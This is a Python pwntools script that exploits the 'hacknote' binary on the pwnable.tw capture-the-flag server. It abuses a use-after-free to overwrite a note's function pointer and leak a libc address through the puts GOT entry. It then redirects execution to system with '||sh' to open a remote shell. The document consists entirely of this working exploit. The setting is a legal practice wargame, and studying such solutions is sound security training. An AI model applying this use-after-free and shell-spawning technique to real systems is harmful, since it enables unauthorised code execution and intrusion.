from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./hacknote"
p = remote("chall.pwnable.tw",10102)
elf = ELF(binary)
libc = ELF("./libc.so.6")

def add(size,content):
    p.sendlineafter("Your choice :",str(1))
    p.sendlineafter("Note size :",str(size))
    p.sendlineafter("Content :",str(content))

def free(idx):
    p.sendlineafter("Your choice :",str(2))
    p.sendlineafter("Index :",str(idx))

def prt(idx):
    p.sendlineafter("Your choice :",str(3))
    p.sendlineafter("Index :",str(idx))

libc_puts_offset = libc.sym['puts']
puts_got = elf.got['puts']
notesFn = 0x804862b

add(16,"aaaaaaa")
add(16,"bbbbbbb")
free(0)
free(1)
add(8,p32(notesFn)+p32(puts_got))
prt(0)
call_back_addr = u32(p.recv(4))
# gdb.attach(p)
log.success("call back addr is 0x%x" % call_back_addr)
libc_base = call_back_addr - libc_puts_offset
log.success("libc base is 0x%x" % libc_base)

system_addr = libc.sym['system'] + libc_base
free(2)
add(8,flat([system_addr,"||sh"]))
prt(0)

p.interactive()
